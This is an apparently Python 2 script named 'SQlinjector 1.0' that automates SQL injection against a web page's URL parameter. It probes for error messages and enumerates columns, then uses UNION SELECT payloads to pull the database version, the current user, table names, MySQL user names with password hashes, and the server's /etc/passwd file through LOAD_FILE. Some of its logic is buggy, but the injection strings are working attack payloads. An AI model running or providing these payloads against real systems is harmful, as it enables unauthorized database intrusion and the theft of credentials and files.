import requests
import sys
import getopt
import re



result =''
global ver
def banner():
    global result

    result+="\n***************************************,"
    result+="* SQlinjector  1.0                      *,"
    result+="***************************************,"


def usage():
    global result
    result+="Usage:,"
    result+="		-w: url (http://somesite.com/news.php?id=FUZZ)\n,"
    result+="     -i: injection strings file \n,"
    result+="example: SQLinjector.py -w http://www.somesite.com/news.php?id=FUZZ \n,"


def start(url):
    global result
    banner()
    
    dictio="sql-dictio"
 #   if len(sys.argv) < 2:

  #     usage()
  #      sys.exit()
  #  try:

    #    opts, args = getopt.getopt(argv,"w:i:")
  #  except getopt.GetoptError:
   #     print ("Error en arguments")
   #     sys.exit()
   # for opt,arg in opts :
      #  if opt == '-w' :
      #      url=arg
      #  elif opt == '-i':
          #  dictio = arg
    try:
        result += "[-] Opening injections file: " + str(dictio)+','
        f = open(dictio, "r")
        name = f.read().splitlines()
    except:
        result +="Failed opening file: "+ dictio+"\n,"
        sys.exit()
    launcher(url,dictio)

def launcher (url,dictio):
    global result

    injected = []

    for x in dictio:
        sqlinjection=x
        injected.append(url.replace("FUZZ",sqlinjection))
    res = injector(injected)

    result+='[+] Detection results:,'
    result+="------------------,"
    for x in res:
        result+=x.split(";")[0]

    result+='[+] Detect columns:,'
    result+="-----------------,"
    res = detect_columns(url)
    result+="Number of columns: " + res+','
    res = detect_columns_names(url)

    result+="[+] Columns names found: ,"
    result+="-------------------------,"
    for col in res:
        print(col)

    result+='[+] DB version: ,'
    print("---------------")
    detect_version(url)

    result+='[+] Current USER: ,'
    result+="---------------"
    detect_user(url)


    result+='[+] Get tables names:,'
    result+="---------------------,"
    detect_table_names(url)

    result+='[+] Attempting MYSQL user extraction,'
    result+="-------------------------------------,"
    steal_users(url)

    filename=("/etc/passwd")
    message = ("\n[+] Reading file: " + filename)
    result+=message+','
    result+="---------------------------------,"
    read_file(url,filename)

def injector(injected):
    global result
    errors = ['Mysql','error in your SQL']
    results = []
    for y in injected:
        result+="[-] Testing errors: " + str(y)+','
        req=requests.get(y)
        for x in errors:
            if req.content.find(x) != -1:
                    res = y + ";" + x
                    results.append(res)
    return results

def detect_columns(url):
    global result

    new_url= url.replace("FUZZ","admin' order by X-- -")
    y=1
    while y < 20:
        req=requests.get(new_url.replace("X",str(y)))
        if req.content.find("Unknown") == -1:
            y+=1
        else:
            break
    return str(y-1)

def detect_version(url):
    global result

    ver1=""
    ver=ver1
    new_url= url.replace("FUZZ","\'%20union%20SELECT%201,CONCAT('TOK',@@version,'TOK')--%20-")
    req=requests.get(new_url)
    raw = req.content
    reg = ur"TOK([a-zA-Z0-9].+?)TOK+?"
    version=re.findall(reg,req.content)
    for ver1 in version:
        result+=str(ver)+','
    return ver

def detect_user(url):
    global result

    user=""
    new_url= url.replace("FUZZ","\'%20union%20SELECT%201,CONCAT('TOK',user(),'TOK')--%20-")
    req=requests.get(new_url)
    raw = req.content
    reg = (ur"TOK([a-zA-Z0-9].+?)TOK+?")
    users=re.findall(reg,req.content)
    for user in users:
        result+=str(user)+','
    return user

def steal_users(url):
    global result

    new_url= url.replace("FUZZ","1\'%20union%20SELECT%20CONCAT('TOK',user,'TOK'),CONCAT('TOK',password,'TOK')%20FROM%20mysql.user--%20-")
    req=requests.get(new_url)
    reg = ur"TOK([\*a-zA-Z0-9].+?)TOK+?"
    users=re.findall(reg,req.content)
    for user in users:
        result+=str(user)+','

def read_file(url, filename):
    global result
    new_url= url.replace("FUZZ","""A\'%20union%20SELECT%201,CONCAT('TOK',
    LOAD_FILE(\'"+filename+"\'),'TOK')--%20-""")
    req=requests.get(new_url)
    reg = ur"TOK(.+?)TOK+?"
    files= re.findall(reg,req.content)
    print req.content
    for x in files:
        if x.find('TOK,'):
            result+=str(x)+','

def detect_table_names(url):
    global result
    new_url= url.replace("FUZZ","\'%20union%20SELECT%20CONCAT('TOK',table_schema,'TOK'),CONCAT('TOK',table_name,'TOK')%20FROM%20information_schema.tables%20WHERE%20table_schema%20!=%20%27mysql%27%20AND%20table_schema%20!=%20%27information_schema%27%20and%20table_schema%20!=%20%27performance_schema%27%20--%20-")
    req=requests.get(new_url)
    raw = req.content
    reg = ur"TOK([a-zA-Z0-9].+?)TOK+?"
    tables=re.findall(reg,req.content)
    for table in tables:
        result+=str(table)+','


def detect_columns_names(url):
    column_names = ['username','user','name','pass','passwd','password','id','role','surname','address']
    new_url= url.replace("FUZZ","admin' group by X-- -")
    valid_cols = []
    for name in column_names:
        req=requests.get(new_url.replace("X",name))
        if req.content.find("Unknown") == -1:
            valid_cols.append(name)
        else:
            pass
    return valid_cols

if __name__ == "__main__":
    
    try:
        start(sys.argv[1:])
    except KeyboardInterrupt:
        result+="SQLinjector interrupted by user..!!,"
